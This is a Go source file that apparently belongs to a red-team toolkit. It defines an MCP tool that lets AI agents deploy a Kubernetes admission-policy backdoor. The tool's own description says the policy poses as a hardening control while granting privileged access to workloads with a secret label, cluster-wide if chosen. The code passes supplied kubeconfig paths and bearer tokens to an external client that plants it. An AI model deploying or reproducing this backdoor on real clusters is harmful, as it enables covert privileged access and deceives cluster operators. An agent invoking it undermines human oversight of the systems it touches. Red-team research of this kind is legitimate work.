package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type VAPBackdoorInput struct {
	Namespace  string `json:"namespace,omitempty"`
	Label      string `json:"label,omitempty"`
	Kubeconfig string `json:"kubeconfig,omitempty"`
	Token      string `json:"token,omitempty"`
}

type VAPBackdoorTool struct {
	exec executor.Executor
}

func NewVAPBackdoor(exec executor.Executor) *VAPBackdoorTool {
	return &VAPBackdoorTool{exec: exec}
}

func (t *VAPBackdoorTool) Name() string { return "kubedagger_vap_backdoor" }

func (t *VAPBackdoorTool) Description() string {
	return "Deploy a ValidatingAdmissionPolicy (VAP) backdoor that grants privileged access to workloads carrying a secret label. The policy looks like a hardening control but whitelists attacker workloads; namespace 'all' makes it cluster-wide."
}

func (t *VAPBackdoorTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"namespace": {
				"type": "string",
				"description": "Namespace to deploy in; 'all' deploys cluster-wide (default: default)"
			},
			"label": {
				"type": "string",
				"description": "Label selector that unlocks the backdoor (default: kubedagger-backdoor=true)"
			},
			"kubeconfig": {
				"type": "string",
				"description": "Path to a kubeconfig file for API access"
			},
			"token": {
				"type": "string",
				"description": "Bearer token for API access"
			}
		}
	}`)
}

func (t *VAPBackdoorTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input VAPBackdoorInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Label, "label"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Kubeconfig, "kubeconfig"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Token, "token"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"vap_backdoor"}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Label != "" {
		args = append(args, "--label", input.Label)
	}
	if input.Kubeconfig != "" {
		args = append(args, "--kubeconfig", input.Kubeconfig)
	}
	if input.Token != "" {
		args = append(args, "--token", input.Token)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger vap_backdoor failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger VAP Backdoor\n\n")
	if output == "" {
		sb.WriteString("Operation completed.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
